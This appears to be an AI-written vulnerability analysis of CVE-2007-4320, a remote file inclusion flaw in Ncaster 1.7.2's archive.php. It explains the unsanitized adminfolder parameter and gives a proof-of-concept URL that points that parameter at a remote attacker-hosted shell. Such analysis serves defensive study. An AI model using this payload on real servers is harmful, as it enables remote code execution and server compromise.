Based on the provided content, here's an analysis of CVE-2007-4320:

**Root Cause of Vulnerability:**
- The vulnerability stems from a remote file inclusion flaw in the `archive.php` script of Ncaster 1.7.2. Specifically, the `require()` function in `archive.php` is vulnerable because it uses an unsanitized input parameter (`adminfolder`).

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is RFI. By manipulating the `adminfolder` parameter in the URL, an attacker can include a malicious file from a remote server.
- **Lack of Input Sanitization:** The application fails to properly sanitize the `adminfolder` parameter before using it in the `require()` function.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary code on the server by including a malicious PHP script.
- **Complete System Compromise:** If the attacker manages to execute arbitrary code, they can potentially gain full control of the web server, leading to data breaches, defacement, or other malicious activities.

**Attack Vectors:**
- **HTTP Request:** The attack vector is through a specially crafted HTTP request to the `archive.php` script, manipulating the `adminfolder` parameter.
- **URL Manipulation:** The attacker manipulates the URL by adding the `adminfolder` parameter and pointing it to a malicious PHP file located on a remote server.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable web server.
- **Understanding of the Vulnerability:** The attacker needs knowledge of the vulnerability's location and the vulnerable parameter to exploit it.
- **Ability to Host Malicious File:** The attacker must have access to a server where a malicious PHP script can be hosted and served to the vulnerable application.

**Technical Details:**

The exploit details provided show how the vulnerability is triggered:

```
"http://www.site.net/ncaster/admin/addons/archive/archive.php?adminfolder=[shell]"
```

Here, `[shell]` would be replaced with a URL pointing to the attacker's malicious PHP script. The `require()` function, due to the lack of sanitization, includes this remote script, leading to code execution on the server.

This detailed analysis provides a good understanding of the vulnerability, how it can be exploited, and the potential impacts.
